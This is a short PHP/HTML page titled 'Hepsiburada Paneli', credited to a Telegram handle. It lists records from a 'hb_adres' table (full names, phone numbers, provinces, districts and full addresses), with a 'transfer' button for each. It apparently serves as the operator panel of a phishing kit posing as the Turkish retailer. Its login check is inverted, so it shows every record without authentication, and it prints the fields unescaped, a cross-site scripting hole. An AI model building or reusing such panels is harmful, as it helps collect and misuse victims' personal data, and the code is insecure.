<?php
session_start();

// Session kontrolü - eğer giriş yapılmamışsa index.php'ye yönlendir
if (!empty($_SESSION['giris'])) {
    header("Location: index.php");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>D E İ C T O -  Hepsiburada Paneli</title>
  <link rel="shortcut icon" href="logo2.jpg" type="image/jpg">
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">

</head>

<style>
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap');

body {
  background-color: rgba(20, 20, 25, 1);
  font-family: 'poppins',sans-serif;
}

header {
            background: url('logom2.gif') repeat-x top center; /* Gifli arka plan */
            color: #fff; /* Yazı rengi */
            padding: 6px; /* Kenar boşluğu */
            border-bottom: 2px solid #fff; /* Alt kenar çizgisi */
            text-align: center;
            text-align: center;font-style: italic; font-weight: 700; background-color: #31285C; color: #fff; text-shadow: 0px 3px 2px #000000;
        }

        
    </style>
<body>

 
  
<header>
        <h1>D E İ C T O</h1>
        <!-- İsterseniz başlığı ve içeriği buraya ekleyebilirsiniz -->
    </header>
    

    <div class="bg-gray-900 h-screen flex flex-col items-center justify-center text-center">
        <div class="text-white">
        
    
    
    
    
<div class="container table-responsive py-5"> 
<table class="table table-bordered table-hover">
  <thead class="thead-dark">
    <tr>
      <th scope="col">ID</th>
      <th scope="col"> Ad Soyad</th>
      <th scope="col"> Telefon</th>
      <th scope="col"> İl</th>
      <th scope="col">İlçe</th>
      <th scope="col">Tam Adres</th>
      <th scope="col">Excel </th>


    </tr>
  </thead>
  <tbody>
   
   
  <?php 

include("baglan.php");

$uzlasma = $conn->query("SELECT * FROM hb_adres ");
foreach ($uzlasma as $deicto) 
 {

    $id = $deicto['id'];
    $adsoyad = $deicto['adsoyad'];
    $telefon = $deicto['telefon'];
    $il = $deicto['il'];
    $ilce = $deicto['ilce'];
    $tamadres = $deicto['tamadres'];


  
 echo " <tr>
 
 <td>$id</td>
 <td>$adsoyad</td>
 <td>$telefon</td>
 <td>$il</td>
 <td>$ilce</td>
 <td>$tamadres</td>
<td>
<a href='aktar.php'>
<button type='submit' name='Submit' class='bg-blue-500 py-2 px-4 text-white rounded-md hover:bg-blue-600 focus:outline-none'> Aktar</button>
</a></td>

</tr>  </tbody>";


    
  

}
    ?>
   
   
 
</table>
</div>

    
    
    
    </div>
        <div class="mt-8">

          
             <div class="mt-4 text-gray-500 text-sm">
                 By Developer <a href="https://t.me/deicto/" class="underline" target="_blank" rel="noopener noreferrer">@deicto</a>
            </div>
        </div>
    </div>
</body>

</html>